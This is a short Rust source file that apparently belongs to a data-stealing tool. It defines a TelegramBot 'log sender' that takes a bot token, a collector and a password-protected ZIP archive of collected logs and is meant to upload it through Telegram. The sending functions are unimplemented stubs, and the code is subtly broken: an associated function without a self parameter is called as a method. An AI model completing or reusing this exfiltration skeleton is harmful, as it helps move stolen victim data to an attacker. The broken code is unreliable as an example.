use crate::{LogFile, LogSender, SendError};
use alloc::sync::Arc;
use alloc::vec::Vec;
use collector::Collector;
use derive_new::new;

#[derive(new)]
pub struct TelegramBot {
    token: Arc<str>
}

impl TelegramBot {
    fn send_as_file<P, C>(archive: Vec<u8>, password: Option<P>, collector: &C) -> Result<(), SendError>
    where
        P: AsRef<str>,
        C: Collector
    {
        unimplemented!()
    }
}

impl LogSender for TelegramBot {
    fn send<P, C>(&self, zip_archive: LogFile, password: Option<P>, collector: &C) -> Result<(), SendError>
    where
        P: AsRef<str>,
        C: Collector
    {
        match zip_archive {
            LogFile::ZipArchive(archive) => self.send_as_file(archive, password, collector),
            _ => unimplemented!()
        }
    }
}